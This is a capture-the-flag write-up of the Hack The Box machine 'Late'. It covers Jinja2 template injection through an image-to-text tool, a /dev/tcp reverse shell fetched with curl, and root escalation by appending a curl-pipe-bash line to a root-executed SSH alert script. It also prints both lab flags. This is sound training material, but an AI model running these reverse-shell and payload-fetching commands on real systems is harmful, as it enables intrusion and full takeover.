---
title: "Late from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Late from HTB
`nmap`showed nothing unusual.
Go to site with `IP`and you will find `subdomain`trough link
add that to `/etc/hosts`
```
10.10.11.156 images.late.htb
```
Then go there and see that it's `img to text`converted
After trying some symbols trough `img` i discovered that site takes `{}`so it's an `ssti`
You will have to write `ssti`code for `Jinja2`, screenshot it (`would recomend WORD or LIBREOFFICE, set font to sans something`) and then use it.
![](/assets/images/Screenshot from 2024-08-16 21-00-44.png)
This should return
```bash
<p>uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)

</p>
```
This means `ssti payload`worked
Now we'll have to get shell. Easiest way to do that is to create an `reverse-shell.sh`with commands:
```bash
#!/bin/bash
sh -i >&/dev/tcp/10.10.16.6/1235 0>&1
```
And `curl`it and then execute. It will should look something like this.
![](/assets/images/Screenshot from 2024-08-16 22-20-29.png)
```bash
rlwrap nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.11.156] 41284
sh: 0: can't access tty; job control turned off
$ script /dev/null -c bash
Script started, file is /dev/null
svc_acc@late:~/app$
```
***
User Flag Is: dfb2cac259dc6fd1ecc098e338590e1a
***
Then search what files do you own `except /home and /proc directories`
```bash
find / -user svc_acc 2>/dev/null | grep -v '/proc\|/home'
/usr/local/sbin
/usr/local/sbin/ssh-alert.sh
/dev/pts/0
```
We'll need `ssh-alert.sh`, you are the owner of this file but can't change anything only add to it trough `echo >>`.
This code is executed when someone tries to connect to `ssh`and it is sent to `root`
So we'll have to add something to this code and when it gets executed we should get `root`
Obviously we'll need `id_rsa`find it in `/home/svc_acc/.ssh/id_rsa`save it and then
```bash
chmod 600 id_rsa
```
add this to code so when we connect we will get root trough `netcat`.
```bash
echo ' curl 10.10.16.6:8000/reverse-shell.sh | bash' >> ssh-alert.sh
```
It will give us `root connection`on new `reverse-shell` when this code is executed.
`simple python3 server should be running`
Go to `ssh`and then try to connect while `nc listener`should be on
```bash
nc -nvlp 1235
listening on [any] 1235 ...
conn![[Screenshot from 2024-08-16 22-48-02.png]]ect to [10.10.16.6] from (UNKNOWN) [10.10.11.156] 38904
bash: cannot set terminal process group (4712): Inappropriate ioctl for device
bash: no job control in this shell
root@late:/#
```
***
Root Flag is: 77963c07bb1f90e5c73011efa9463c2e
***
![](/assets/images/Screenshot from 2024-08-16 22-48-02.png)
